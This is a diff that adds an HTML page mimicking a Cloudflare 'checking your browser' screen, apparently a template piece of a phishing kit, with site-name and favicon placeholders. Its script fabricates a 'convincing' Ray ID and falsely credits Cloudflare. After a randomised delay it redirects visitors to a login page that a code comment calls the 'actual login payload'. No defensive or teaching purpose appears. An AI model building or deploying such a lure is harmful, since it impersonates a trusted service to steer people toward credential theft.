@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Just a moment...</title>
+    <link rel="icon" href="{{FAVICON_URL}}">
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            background-color: #ffffff;
+            color: #1a1a1a;
+        }
+
+        .cf-container {
+            text-align: center;
+            padding: 40px;
+            max-width: 600px;
+        }
+
+        .cf-spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            border-left-color: #f38020;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 30px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 20px;
+        }
+
+        p {
+            font-size: 15px;
+            color: #595959;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+
+        .cf-footer {
+            margin-top: 40px;
+            font-size: 13px;
+            color: #8c8c8c;
+        }
+
+        .cf-ray {
+            font-family: monospace;
+            color: #8c8c8c;
+        }
+    </style>
+</head>
+<body>
+    <div class="cf-container">
+        <div class="cf-spinner"></div>
+        <h1>Checking your browser before accessing {{SITE_NAME}}.</h1>
+        <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
+        <p>Please allow up to 5 seconds…</p>
+        
+        <div class="cf-footer">
+            Ray ID: <span class="cf-ray" id="ray-id"></span> &bull; 
+            Performance & security by Cloudflare
+        </div>
+    </div>
+
+    <script>
+        // Generate convincing Ray ID
+        document.getElementById('ray-id').textContent = Array.from({length: 16}, () => Math.floor(Math.random() * 16).toString(16)).join('');
+
+        // Wait 3-5 seconds then redirect to actual login payload
+        setTimeout(() => {
+            window.location.href = 'login.html';
+        }, Math.floor(Math.random() * 2000) + 3000);
+    </script>
+</body>
+</html>
